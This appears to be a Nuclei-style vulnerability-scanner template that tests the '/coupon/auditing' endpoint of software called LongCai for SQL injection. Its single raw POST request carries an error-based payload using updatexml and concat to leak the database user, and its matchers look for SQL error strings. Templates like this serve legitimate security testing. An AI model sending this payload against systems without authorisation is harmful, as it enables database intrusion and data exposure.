id: LongCai-auditing-sqlInjection

info:
  name: LongCai-auditing-sqlInjection
  author: iSee857
  severity: high
  description: LongCai-auditing-sqlInjection

requests:
  - method: POST
    raw:
      - |
        POST /coupon/auditing HTTP/1.1
        Host: 
        X-Requested-With: XMLHttpRequest
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0

        id=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "SQLSTATE"
          - "-100"
          - "message"

      - type: status
        status:
          - 200